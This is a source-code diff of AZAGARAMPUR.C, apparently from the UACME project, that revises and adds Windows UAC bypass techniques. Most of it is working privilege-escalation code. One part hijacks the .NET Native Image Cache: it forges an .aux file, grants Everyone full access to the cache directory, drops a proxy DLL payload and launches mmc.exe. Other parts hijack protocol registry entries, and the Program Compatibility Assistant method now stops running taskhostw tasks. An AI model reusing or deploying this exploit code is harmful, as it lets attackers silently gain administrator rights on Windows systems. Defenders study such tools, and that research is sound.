@@ -4,9 +4,9 @@
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.57
+*  VERSION:     3.58
 *
-*  DATE:        08 Nov 2021
+*  DATE:        01 Dec 2021
 *
 *  UAC bypass methods from AzAgarampur.
 *
@@ -89,8 +89,6 @@ BOOL ucmxNgenLogLastWrite(
 * Purpose:
 *
 * Bypass UAC by by Dll hijack of Native Image Cache.
-* 
-* Note: produces mixed results on Windows 11.
 *
 */
 NTSTATUS ucmNICPoisonMethod(
@@ -109,11 +107,7 @@ NTSTATUS ucmNICPoisonMethod(
     LPWSTR oldSecurity = NULL;
     LPWSTR lpAssemblyFilePath = NULL, lpTargetFileName = NULL;
 
-    BOOLEAN IsWin7;
-
-#ifdef _DEBUG
-    BOOLEAN bWaitFailed = FALSE;
-#endif
+    BOOLEAN IsWin7, bSecurityReset = FALSE;
 
     FILETIME lastWriteTime, checkTime;
 
@@ -126,13 +120,13 @@ NTSTATUS ucmNICPoisonMethod(
 
         IsWin7 = (g_ctx->dwBuildNumber < NT_WIN8_RTM);
 
-        if (!supInitFusion(IsWin7 ? 2 : 4))
+        if (!fusUtilInitFusion(IsWin7 ? 2 : 4))
             break;
 
-        if (!supFusionGetAssemblyPathByName(TEXT("Accessibility"), &lpAssemblyFilePath))
+        if (!fusUtilGetAssemblyPathByName(ASSEMBLY_ACCESSIBILITY, &lpAssemblyFilePath))
             break;
 
-        if (!supFusionGetImageMVID(lpAssemblyFilePath, &targetMVID))
+        if (!fusUtilGetImageMVID(lpAssemblyFilePath, &targetMVID))
             break;
 
         if (!IsWin7) {
@@ -158,10 +152,6 @@ NTSTATUS ucmNICPoisonMethod(
             // Wait for task completion.
             //
 
-#ifdef _DEBUG
-            bWaitFailed = TRUE;
-#endif
-
             do {
 
                 Sleep(2000);
@@ -171,9 +161,6 @@ NTSTATUS ucmNICPoisonMethod(
                     if (ucmxNgenLogLastWrite(&checkTime)) {
 
                         if (CompareFileTime(&lastWriteTime, &checkTime) < 0) {
-#ifdef _DEBUG
-                            bWaitFailed = FALSE;
-#endif
                             break;
                         }
                     }
@@ -185,13 +172,6 @@ NTSTATUS ucmNICPoisonMethod(
             } while (iRetryCount);
 
         }
-
-#ifdef _DEBUG
-        if (bWaitFailed) {
-            OutputDebugString(TEXT(">>wait failed"));
-            DebugBreak();
-        }
-#endif
 
         //
         // Locate target NI file.
@@ -213,9 +193,9 @@ NTSTATUS ucmNICPoisonMethod(
 #endif
         _strcat(szFileName, TEXT("\\Accessibility\\"));
 
-        if (!supFusionScanDirectory(szFileName,
+        if (!fusUtilScanDirectory(szFileName,
             TEXT("*.dll"),
-            (pfnFusionScanFilesCallback)supFusionFindFileByMVIDCallback,
+            (pfnFusionScanFilesCallback)fusUtilFindFileByMVIDCallback,
             &scanParam))
         {
             break;
@@ -254,6 +234,8 @@ NTSTATUS ucmNICPoisonMethod(
         {
             break;
         }
+
+        bSecurityReset = TRUE;
 
         //
         // Overwrite file with Fubuki.
@@ -317,16 +299,23 @@ NTSTATUS ucmNICPoisonMethod(
 
         if (oldSecurity) {
 
-            ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
-                DACL_SECURITY_INFORMATION,
-                SE_FILE_OBJECT,
-                oldSecurity);
+            if (bSecurityReset) {
+
+                ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
+                    DACL_SECURITY_INFORMATION,
+                    SE_FILE_OBJECT,
+                    oldSecurity);
+
+            }
 
             CoTaskMemFree(oldSecurity);
         }
 
         supHeapFree(lpTargetFileName);
     }
+
+    if (!NT_SUCCESS(MethodResult))
+        supSetGlobalCompletionEvent();
 
     return MethodResult;
 }
@@ -540,10 +529,8 @@ NTSTATUS ucmIeAddOnInstallMethod(
     if (adminInstallerUuid)
         SysFreeString(adminInstallerUuid);
 
-    if (MethodResult == STATUS_SUCCESS) {
-        if (lpDirectory) {
-            ucmMasqueradedDeleteDirectoryFileCOM(lpDirectory);
-        }
+    if (NT_SUCCESS(MethodResult) && lpDirectory) {
+        ucmMasqueradedDeleteDirectoryFileCOM(lpDirectory);
     }
 
     if (cacheItemFilePath)
@@ -567,12 +554,10 @@ NTSTATUS ucmIeAddOnInstallMethod(
 * Purpose:
 *
 * Bypass UAC by SecurityCenter COM object and HTTP protocol registry hijack.
-* 
-* Note: produces mixed results on Windows 11.
 *
 */
 NTSTATUS ucmWscActionProtocolMethod(
-    _In_ LPWSTR lpszPayload
+    _In_ LPCWSTR lpszPayload
 )
 {
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
@@ -596,8 +581,9 @@ NTSTATUS ucmWscActionProtocolMethod(
             break;
 
         MethodResult = supFindUserAssocSet(&SetUserAssoc);
-        if (!NT_SUCCESS(MethodResult))
+        if (!NT_SUCCESS(MethodResult)) {
             break;
+        }
 
         MethodResult = supRegisterShellAssoc(T_PROTO_HTTP,
             protoGuidString,
@@ -606,8 +592,9 @@ NTSTATUS ucmWscActionProtocolMethod(
             FALSE,
             NULL);
 
-        if (!NT_SUCCESS(MethodResult))
+        if (!NT_SUCCESS(MethodResult)) {
             break;
+        }
 
         MethodResult = STATUS_ACCESS_DENIED;
 
@@ -616,19 +603,21 @@ NTSTATUS ucmWscActionProtocolMethod(
             CLSCTX_LOCAL_SERVER,
             &WscAdminObject);
 
-        if (FAILED(r))
-            break;
+        if (SUCCEEDED(r)) {
 
-        r = WscAdminObject->lpVtbl->Initialize(WscAdminObject);
-        if (FAILED(r))
-            break;
+            r = WscAdminObject->lpVtbl->Initialize(WscAdminObject);
+            if (SUCCEEDED(r)) {
 
-        r = WscAdminObject->lpVtbl->DoModalSecurityAction(WscAdminObject, NULL, 103, NULL);
+                supEnableToastForProtocol(T_PROTO_HTTP, FALSE);
 
-        Sleep(1000);
+                r = WscAdminObject->lpVtbl->DoModalSecurityAction(WscAdminObject, NULL, 103, NULL);
 
-        if (SUCCEEDED(r))
-            MethodResult = STATUS_SUCCESS;
+                Sleep(1000);
+
+                if (SUCCEEDED(r)) MethodResult = STATUS_SUCCESS;
+
+            }
+        }
 
     } while (FALSE);
 
@@ -668,7 +657,7 @@ NTSTATUS ucmWscActionProtocolMethod(
 *
 */
 NTSTATUS ucmFwCplLuaMethod2(
-    _In_ LPWSTR lpszPayload
+    _In_ LPCWSTR lpszPayload
 )
 {
     BOOL fEnvSet = FALSE, fDirCreated = FALSE;
@@ -915,7 +904,7 @@ NTSTATUS ucmFwCplLuaMethod2(
 *
 */
 NTSTATUS ucmMsSettingsProtocolMethod(
-    _In_ LPWSTR lpszPayload
+    _In_ LPCWSTR lpszPayload
 )
 {
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
@@ -1154,7 +1143,7 @@ VOID ucmxCleanupNoStore(
 *
 */
 NTSTATUS ucmxMsStoreProtocolNoStore(
-    _In_ LPWSTR lpszPayload
+    _In_ LPCWSTR lpszPayload
 )
 {
     HANDLE classesKey = NULL, protoKey = NULL;
@@ -1223,49 +1212,6 @@ NTSTATUS ucmxMsStoreProtocolNoStore(
 }
 
 /*
-* ucmxSetNoOpenWithForAppxId
-*
-* Purpose:
-*
-* Place NoOpenWith parameter for application key.
-*
-*/
-VOID ucmxSetNoOpenWithForAppxId(
-    _In_ LPCWSTR lpComponentName,
-    _In_ LPCWSTR lpPackageName
-)
-{
-    LPWSTR lpAppxId = NULL;
-    DWORD cbAppxId = 0;
-    HANDLE classesKey = NULL, appKey = NULL;
-    NTSTATUS ntStatus;
-
-    if (supGetAppxId(lpComponentName,
-        lpPackageName,
-        &lpAppxId,
-        &cbAppxId))
-    {
-        ntStatus = supOpenClassesKey(NULL, &classesKey);
-        if (NT_SUCCESS(ntStatus)) {
-
-            if (ERROR_SUCCESS == RegOpenKeyEx(classesKey,
-                lpAppxId,
-                0,
-                KEY_WRITE,
-                (HKEY*)&appKey))
-            {
-                RegSetValueEx(appKey, TEXT("NoOpenWith"), 0, REG_SZ, NULL, 0);
-                RegCloseKey(appKey);
-            }
-
-            NtClose(classesKey);
-        }
-        supHeapFree(lpAppxId);
-    }
-
-}
-
-/*
 * ucmMsStoreProtocolMethod
 *
 * Purpose:
@@ -1274,7 +1220,7 @@ VOID ucmxSetNoOpenWithForAppxId(
 *
 */
 NTSTATUS ucmMsStoreProtocolMethod(
-    _In_ LPWSTR lpszPayload
+    _In_ LPCWSTR lpszPayload
 )
 {
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
@@ -1312,10 +1258,7 @@ NTSTATUS ucmMsStoreProtocolMethod(
                 break;
             }
 
-            //
-            // Set NoOpenWith
-            //
-            ucmxSetNoOpenWithForAppxId(TEXT("WindowsStore"), T_MSWINDOWSSTORE);
+            supEnableToastForProtocol(T_MSWINDOWSSTORE, FALSE);
 
             //
             // Register shell protocol.
@@ -1475,6 +1418,118 @@ typedef struct _PCA_LOADER_BLOCK {
 } PCA_LOADER_BLOCK;
 
 /*
+* ucmxExamineTaskhost
+*
+* Purpose:
+*
+* Find all tasks registered with the host process and stop them.
+*
+*/
+BOOL ucmxExamineTaskhost(
+    _In_ HANDLE UniqueProcessId
+)
+{
+    HRESULT hr = E_FAIL;
+    ULONG processId;
+    LONG i, cTasks = 0;
+    VARIANT varDummy, varIndex;
+    ITaskService* pService = NULL;
+    IRunningTaskCollection* pTasks = NULL;
+    IRunningTask* pTask;
+    TASK_STATE taskState;
+
+    do {
+
+        hr = CoCreateInstance(&CLSID_TaskScheduler,
+            NULL,
+            CLSCTX_INPROC_SERVER,
+            &IID_ITaskService,
+            (void**)&pService);
+
+        if (FAILED(hr))
+            break;
+
+        VariantInit(&varDummy);
+
+        hr = pService->lpVtbl->Connect(pService,
+            varDummy,
+            varDummy,
+            varDummy,
+            varDummy);
+
+        if (FAILED(hr))
+            break;
+
+        hr = pService->lpVtbl->GetRunningTasks(pService,
+            TASK_ENUM_HIDDEN,
+            &pTasks);
+
+        if (FAILED(hr))
+            break;
+
+        hr = pTasks->lpVtbl->get_Count(pTasks, &cTasks);
+
+        if (FAILED(hr))
+            break;
+
+        varIndex.vt = VT_INT;
+
+        for (i = 1; i <= cTasks; i++) {
+
+            varIndex.lVal = i;
+
+            hr = pTasks->lpVtbl->get_Item(pTasks, varIndex, &pTask);
+            if (SUCCEEDED(hr)) {
+
+                processId = 0;
+                hr = pTask->lpVtbl->get_EnginePID(pTask, &processId);
+                if (SUCCEEDED(hr) && processId == HandleToUlong(UniqueProcessId)) {
+
+                    hr = pTask->lpVtbl->get_State(pTask, &taskState);
+                    if (taskState == TASK_STATE_RUNNING) {
+                        hr = pTask->lpVtbl->Stop(pTask);
+                    }
+                }
+                pTask->lpVtbl->Release(pTask);
+            }
+        }
+
+
+    } while (FALSE);
+
+    if (pTasks)
+        pTasks->lpVtbl->Release(pTasks);
+
+    if (pService)
+        pService->lpVtbl->Release(pService);
+
+    return SUCCEEDED(hr);
+}
+
+/*
+* ucmxEnumTaskhost
+*
+* Purpose:
+*
+* Callback for taskhost task enumeration.
+*
+*/
+BOOL CALLBACK ucmxEnumTaskhost(
+    _In_ PSYSTEM_PROCESSES_INFORMATION ProcessEntry,
+    _In_ PVOID UserContext
+)
+{
+    PUNICODE_STRING targetProcess = (PUNICODE_STRING)UserContext;
+
+    if (!RtlEqualUnicodeString(&ProcessEntry->ImageName, targetProcess, TRUE))
+        return FALSE;
+
+    ucmxExamineTaskhost(ProcessEntry->UniqueProcessId);
+
+    return FALSE;
+}
+
+/*
 * ucmPcaMethod
 *
 * Purpose:
@@ -1482,8 +1537,6 @@ typedef struct _PCA_LOADER_BLOCK {
 * Bypass UAC using Program Compatibility Assistant.
 *
 * AlwaysNotify compatible.
-* 
-* Note: produces mixed results on Windows 11.
 *
 */
 NTSTATUS ucmPcaMethod(
@@ -1499,6 +1552,8 @@ NTSTATUS ucmPcaMethod(
 
     HANDLE hSharedSection = NULL, hSharedEvent = NULL;
     HANDLE hShellProcess = NULL;
+
+    UNICODE_STRING uStrTaskhost = RTL_CONSTANT_STRING(TASKHOSTW_EXE);
 
     RPC_BINDING_HANDLE rpcHandle = NULL;
     RPC_STATUS rpcStatus;
@@ -1616,6 +1671,9 @@ NTSTATUS ucmPcaMethod(
         {
             break;
         }
+
+        supEnumProcessesForSession(NtCurrentPeb()->SessionId,
+            (pfnEnumProcessCallback)ucmxEnumTaskhost, (PVOID)&uStrTaskhost);
 
         //
         // Create destination dir "system32"
@@ -1870,6 +1928,405 @@ NTSTATUS ucmPcaMethod(
         CoUninitialize();
 
     if (MethodResult != STATUS_SUCCESS)
+        supSetGlobalCompletionEvent();
+
+    return MethodResult;
+}
+
+NTSTATUS ucmxGenerateAUX(
+    _In_ LPCWSTR AssemblyName,
+    _Out_ PVOID* AuxData,
+    _Out_ PSIZE_T AuxDataSize,
+    _Out_opt_ GUID* ModuleGuid
+)
+{
+    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
+    LPWSTR lpAssemblyFilePath = NULL;
+
+    HRESULT hr;
+    IAssemblyCache* asmCache = NULL;
+    IAssemblyEnum* asmEnum = NULL;
+    IAssemblyName* asmName = NULL;
+
+    GUID mvid;
+
+    LPWSTR lpAssemblyName = NULL, lpDisplayName = NULL;
+    LPSTR lpDisplayNameANSI = NULL;
+
+    BOOL bFound = FALSE;
+    SIZE_T auxSize = 0;
+    PBYTE auxPtr = NULL, pbPad;
+    PULONG dataPtr;
+
+    SIZE_T cchName = 0, cchDisplayName = 0, padBytes, i;
+
+    *AuxData = NULL;
+    *AuxDataSize = 0;
+
+    if (!fusUtilInitFusion((g_ctx->dwBuildNumber < NT_WIN8_RTM) ? 2 : 4))
+        return ntStatus;
+
+    RtlSecureZeroMemory(&mvid, sizeof(mvid));
+
+    do {
+
+        hr = g_ctx->FusionContext.CreateAssemblyEnum(&asmEnum, NULL, NULL, ASM_CACHE_GAC, NULL);
+        if ((FAILED(hr)) || (asmEnum == NULL))
+            break;
+
+        hr = g_ctx->FusionContext.CreateAssemblyCache(&asmCache, 0);
+        if ((FAILED(hr)) || (asmCache == NULL))
+            break;
+
+
+        //
+        // Locate assembly and remember it name/display name.
+        //
+        while ((hr = asmEnum->lpVtbl->GetNextAssembly(asmEnum, NULL, &asmName, 0)) == S_OK) {
+
+            if (SUCCEEDED(fusUtilGetAssemblyName(asmName,
+                &lpAssemblyName,
+                &cchName,
+                &lpDisplayName,
+                &cchDisplayName)))
+            {
+
+                if (_strcmpi(AssemblyName, lpAssemblyName) == 0) {
+                    bFound = TRUE;
+                    break;
+                }
+                else {
+                    supHeapFree(lpAssemblyName);
+                    supHeapFree(lpDisplayName);
+                    lpAssemblyName = NULL;
+                    lpDisplayName = NULL;
+                }
+
+            }
+
+            asmName->lpVtbl->Finalize(asmName);
+            asmName->lpVtbl->Release(asmName);
+        }
+
+        if (FAILED(hr) || bFound == FALSE)
+            break;
+
+        lpDisplayNameANSI = (LPSTR)supHeapAlloc((1 + cchDisplayName) * sizeof(CHAR));
+        if (lpDisplayNameANSI == NULL)
+            break;
+
+        WideCharToMultiByte(CP_ACP,
+            0,
+            lpDisplayName,
+            (INT)cchDisplayName,
+            lpDisplayNameANSI,
+            (INT)(1 + cchDisplayName),
+            NULL,
+            NULL);
+
+        //
+        // Query assembly filepath.
+        //
+        hr = fusUtilGetAssemblyPath(asmCache, AssemblyName, &lpAssemblyFilePath);
+        if (FAILED(hr))
+            break;
+
+        //
+        // Remember MVID.
+        //
+        if (!fusUtilGetImageMVID(lpAssemblyFilePath, &mvid))
+            break;
+
+        //
+        // Allocate buffer for AUX data.
+        //
+        auxSize = ALIGN_UP_TYPE(100 + (SIZE_T)cchDisplayName, sizeof(ULONG));
+        auxPtr = (PBYTE)supHeapAlloc(auxSize);
+        if (auxPtr == NULL)
+            break;
+
+        dataPtr = (PULONG)auxPtr;
+
+        //
+        // Magic values go brrr.
+        //
+
+        *dataPtr++ = 0x5;
+        *dataPtr++ = (ULONG)auxSize - 8;
+        *dataPtr++ = 0xB;
+        *dataPtr++ = (ULONG)auxSize - 16;
+        *dataPtr++ = 0xD;
+        *dataPtr++ = (ULONG)auxSize - 100;
+        RtlCopyMemory(dataPtr, lpDisplayNameANSI, cchDisplayName);
+
+        padBytes = (auxSize - 100) - cchDisplayName;
+
+        pbPad = (PBYTE)RtlOffsetToPointer(dataPtr, cchDisplayName);
+
+        for (i = 0; i < padBytes; i++)
+            *pbPad++ = 0xCC;
+
+        dataPtr = (PULONG)RtlOffsetToPointer(dataPtr, cchDisplayName + padBytes);
+
+        *dataPtr++ = 0x7;
+        *dataPtr++ = 0x4;
+        *dataPtr++ = 0x1109;
+        *dataPtr++ = 0x2;
+        *dataPtr++ = 0x8;
+        *dataPtr++ = 0;
+        *dataPtr++ = 0;
+        *dataPtr++ = 0xF;
+        *dataPtr++ = 0x4;
+        *dataPtr++ = 0;
+        *dataPtr++ = 0x10;
+        *dataPtr++ = 0x4;
+        *dataPtr++ = 0x1;
+        *dataPtr++ = 0x9;
+        *dataPtr++ = 0x10;
+
+        RtlCopyMemory(dataPtr, &mvid, sizeof(mvid));
+
+        *AuxData = auxPtr;
+        *AuxDataSize = auxSize;
+        if (ModuleGuid) *ModuleGuid = mvid;
+
+        ntStatus = STATUS_SUCCESS;
+
+    } while (FALSE);
+
+    if (lpAssemblyFilePath)
+        supHeapFree(lpAssemblyFilePath);
+
+    if (lpAssemblyName)
+        supHeapFree(lpAssemblyName);
+    if (lpDisplayName)
+        supHeapFree(lpDisplayName);
+    if (lpDisplayNameANSI)
+        supHeapFree(lpDisplayNameANSI);
+
+    if (asmName) {
+        asmName->lpVtbl->Finalize(asmName);
+        asmName->lpVtbl->Release(asmName);
+    }
+
+    if (asmCache)
+        asmCache->lpVtbl->Release(asmCache);
+
+    if (asmEnum)
+        asmEnum->lpVtbl->Release(asmEnum);
+
+    if (!NT_SUCCESS(ntStatus)) {
+
+        if (auxPtr)
+            supHeapFree(auxPtr);
+
+    }
+
+    return ntStatus;
+}
+
+/*
+* ucmNICPoisonMethod2
+*
+* Purpose:
+*
+* Bypass UAC by by Dll hijack of Native Image Cache.
+*
+*/
+NTSTATUS ucmNICPoisonMethod2(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED, ntStatus;
+    WCHAR szFileName[MAX_PATH * 2];
+    WCHAR szTargetDir[MAX_PATH * 2];
+    WCHAR szCacheDir[MAX_PATH * 2];
+    WCHAR szMVID[64];
+
+    LPWSTR oldSecurity = NULL;
+    SIZE_T dirLen;
+    GUID targetMVID;
+
+    PVOID auxData = NULL;
+    SIZE_T auxDataSize;
+
+    BOOL bNeedSecurityReset = FALSE, bNeedRestore = FALSE;
+    BOOL IsWin7 = (g_ctx->dwBuildNumber < NT_WIN8_RTM);
+
+    do {
+
+        //
+        // Build cache path.
+        //
+        _strcpy(szCacheDir, g_ctx->szSystemRoot);
+        _strcat(szCacheDir, TEXT("assembly\\NativeImages_"));
+
+        if (IsWin7)
+            _strcat(szCacheDir, NET2_DIR);
+        else
+            _strcat(szCacheDir, NET4_DIR);
+
+#ifdef _WIN64
+        _strcat(szCacheDir, TEXT("_64"));
+#else
+        _strcat(szCacheDir, TEXT("_32"));
+#endif
+        ntStatus = ucmxGenerateAUX(ASSEMBLY_MMCEX, &auxData, &auxDataSize, NULL);
+        if (!NT_SUCCESS(ntStatus)) {
+            MethodResult = ntStatus;
+            break;
+        }
+
+        RtlSecureZeroMemory(&szMVID, sizeof(szMVID));
+        RtlSecureZeroMemory(&targetMVID, sizeof(targetMVID));
+        if (!fusUtilGetAssemblyMVIDFromZapCache(ASSEMBLY_MMCEX, &targetMVID))
+            break;
+
+        fusUtilBinToUnicodeHex((PBYTE)&targetMVID, sizeof(GUID), szMVID);
+
+        //
+        // Remember old directory security permissions.
+        //
+        if (!ucmMasqueradedGetObjectSecurityCOM(szCacheDir,
+            DACL_SECURITY_INFORMATION,
+            SE_FILE_OBJECT,
+            &oldSecurity))
+        {
+            break;
+        }
+
+        //
+        // Reset target file permissions.
+        //
+        if (!ucmMasqueradedSetObjectSecurityCOM(szCacheDir,
+            DACL_SECURITY_INFORMATION,
+            SE_FILE_OBJECT,
+            T_SDDL_EVERYONE_FULL_ACCESS))
+        {
+            break;
+        }
+
+        bNeedSecurityReset = TRUE;
+
+        //
+        // Move MMCEx to MMCEx.$
+        //
+        _strcpy(szFileName, szCacheDir);
+        _strcat(szFileName, MMCEX_DIR);
+
+        _strcpy(szTargetDir, szFileName);
+        _strcat(szTargetDir, TEXT(".$"));
+
+        if (!MoveFileEx(szFileName,
+            szTargetDir,
+            MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
+        {
+            break;
+        }
+
+        bNeedRestore = TRUE;
+
+        //
+        // 1. MMCEx
+        // 2. MMCEx\<MVID>\
+        // 3. MMCEx\<MVID>\MMCEx.ni.dll
+        // 4. MMCEx\<MVID>\MMCEx.ni.aux
+        //
+        // 1. MMCEx
+        //
+        if (!CreateDirectory(szFileName, NULL))
+            if (GetLastError() != ERROR_ALREADY_EXISTS) {
+                break;
+            }
+
+        //
+        // 2. Subdirectory <MVID>
+        //
+        supPathAddBackSlash(szFileName);
+        _strcat(szFileName, szMVID);
+        if (!CreateDirectory(szFileName, NULL))
+            if (GetLastError() != ERROR_ALREADY_EXISTS) {
+                break;
+            }
+
+        //
+        // 3. Drop payload.
+        //
+        supPathAddBackSlash(szFileName);
+        dirLen = _strlen(szFileName);
+        _strcat(szFileName, MMCEX_NI_DLL);
+        if (!supWriteBufferToFile(szFileName, ProxyDll, ProxyDllSize)) {
+            break;
+        }
+
+        //
+        // 4. Drop aux payload.
+        //
+        szFileName[dirLen] = 0;
+        _strcat(szFileName, MMCEX_NI_DLL_AUX);
+        if (!supWriteBufferToFile(szFileName, auxData, (ULONG)auxDataSize)) {
+            break;
+        }
+
+        //
+        // Run target.
+        //
+        _strcpy(szFileName, g_ctx->szSystemDirectory);
+        _strcat(szFileName, MMC_EXE);
+
+        if (supRunProcess2(szFileName,
+            WF_MSC,
+            NULL,
+            SW_SHOW,
+            SUPRUNPROCESS_TIMEOUT_DEFAULT))
+        {
+            MethodResult = STATUS_SUCCESS;
+        }
+
+    } while (FALSE);
+
+
+    if (bNeedRestore) {
+
+        //
+        // Remove fake directory.
+        //
+        _strcpy(szFileName, szCacheDir);
+        _strcat(szFileName, MMCEX_DIR);
+        supRemoveDirectoryRecursive(szFileName);
+
+        //
+        // Restore original MMCEx directory.
+        //
+        _strcat(szFileName, TEXT(".$"));
+        _strcpy(szTargetDir, szCacheDir);
+        _strcat(szTargetDir, MMCEX_DIR);
+        MoveFileEx(szFileName,
+            szTargetDir,
+            MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
+
+    }
+
+    //
+    // Revert directory security.
+    //
+    if (oldSecurity) {
+
+        if (bNeedSecurityReset) {
+            ucmMasqueradedSetObjectSecurityCOM(szCacheDir,
+                DACL_SECURITY_INFORMATION,
+                SE_FILE_OBJECT,
+                oldSecurity);
+        }
+
+        CoTaskMemFree(oldSecurity);
+    }
+
+    if (auxData)
+        supHeapFree(auxData);
+
+    if (!NT_SUCCESS(MethodResult))
         supSetGlobalCompletionEvent();
 
     return MethodResult;
